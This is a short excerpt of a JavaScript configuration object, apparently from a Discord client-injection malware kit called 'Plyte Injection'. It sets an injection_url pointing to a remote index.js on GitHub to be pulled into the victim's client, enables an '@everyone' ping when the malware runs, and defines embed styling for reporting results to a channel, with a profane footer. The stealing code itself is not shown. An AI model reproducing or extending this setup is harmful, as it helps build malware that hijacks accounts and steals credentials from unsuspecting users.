...
const config = {
  ...
  ping_on_run: true, 
  ping_val: '@everyone',
  embed_name: 'Plyte Injection', 
  embed_icon: 'https://upload.wikimedia.org/wikipedia/commons/e/ef/Pluto_in_True_Color_-_High-Res.jpg'.replace(/ /g, '%20'), 
  embed_color: 2895667, 
  injection_url: 'https://raw.githubusercontent.com/Vortex123321/39821048328423/main/index.js', 
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: 'If god exists its fucking me',
        },
      },
    ],
  };
